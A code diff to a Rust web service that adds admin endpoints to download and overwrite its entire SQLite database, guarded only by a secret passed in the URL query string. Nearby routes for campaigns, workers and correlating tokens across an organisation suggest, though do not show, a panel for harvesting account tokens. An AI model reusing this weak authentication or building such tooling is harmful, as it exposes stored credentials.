@@ -2008,6 +2008,85 @@ async fn finalize_worker_handler(
 }
 
 // ============================================================
+// DATABASE BACKUP & RESTORE — for Railway migration
+// ============================================================
+
+/// Download the SQLite database file. Returns the raw .db file.
+/// Protected by a simple query-param auth so it can't be accessed
+/// without the MASTER_SECRET.
+async fn backup_db_handler(
+    query: web::Query<std::collections::HashMap<String, String>>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let key = query.get("key").cloned().unwrap_or_default();
+    let expected = std::env::var("MASTER_SECRET").unwrap_or_default();
+    if key != expected || expected.is_empty() {
+        return HttpResponse::Unauthorized().body("Invalid backup key");
+    }
+
+    let db_path = std::env::var("DATABASE_URL")
+        .unwrap_or_else(|_| "sqlite:///app/data/simdiatokens.db".to_string());
+    let file_path = db_path.replace("sqlite:", "").replace("sqlite://", "");
+
+    match std::fs::read(&file_path) {
+        Ok(data) => {
+            let filename = file_path.rsplit('/').next().unwrap_or("simdiatokens.db");
+            HttpResponse::Ok()
+                .content_type("application/octet-stream")
+                .header("Content-Disposition", format!("attachment; filename=\"{}\"", filename))
+                .body(data)
+        }
+        Err(e) => {
+            eprintln!("[backup] Failed to read DB at {}: {}", file_path, e);
+            HttpResponse::InternalServerError().body(format!("Failed to read database: {}", e))
+        }
+    }
+}
+
+/// Restore the SQLite database from a raw uploaded file.
+/// Accepts the .db file as the raw POST body. Protected by MASTER_SECRET.
+async fn restore_db_handler(
+    query: web::Query<std::collections::HashMap<String, String>>,
+    body: web::Bytes,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let key = query.get("key").cloned().unwrap_or_default();
+    let expected = std::env::var("MASTER_SECRET").unwrap_or_default();
+    if key != expected || expected.is_empty() {
+        return HttpResponse::Unauthorized().body("Invalid restore key");
+    }
+
+    if body.is_empty() {
+        return HttpResponse::BadRequest().body("Empty body — send the .db file as raw POST data");
+    }
+
+    let db_path = std::env::var("DATABASE_URL")
+        .unwrap_or_else(|_| "sqlite:///app/data/simdiatokens.db".to_string());
+    let file_path = db_path.replace("sqlite:", "").replace("sqlite://", "");
+
+    // Back up the old DB just in case
+    let backup_path = format!("{}.bak", file_path);
+    let _ = std::fs::rename(&file_path, &backup_path);
+
+    // Write the new DB
+    match std::fs::write(&file_path, &body) {
+        Ok(_) => {
+            println!("[restore] Database restored: {} ({} bytes)", file_path, body.len());
+            HttpResponse::Ok().json(serde_json::json!({
+                "success": true,
+                "message": format!("Database restored ({} bytes). Restart the service for changes to take effect.", body.len()),
+                "size": body.len(),
+            }))
+        }
+        Err(e) => {
+            eprintln!("[restore] Failed to write DB: {}", e);
+            let _ = std::fs::rename(&backup_path, &file_path);
+            HttpResponse::InternalServerError().body(format!("Failed to write database: {}", e))
+        }
+    }
+}
+
+// ============================================================
 // CROSS-ACCOUNT INTELLIGENCE — Correlate tokens from same org
 // ============================================================
 
@@ -2824,6 +2903,8 @@ async fn main() -> std::io::Result<()> {
             .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
             .route("/api/admins/one-click-deploy", web::post().to(one_click_deploy_handler))
             .route("/api/admins/finalize-worker", web::post().to(finalize_worker_handler))
+            .route("/api/admin/backup-db", web::get().to(backup_db_handler))
+            .route("/api/admin/restore-db", web::post().to(restore_db_handler))
             .route("/api/intelligence/cross-account/{token_id}", web::get().to(cross_account_intelligence_handler))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
             .route("/api/campaigns/create", web::post().to(create_campaign_handler))
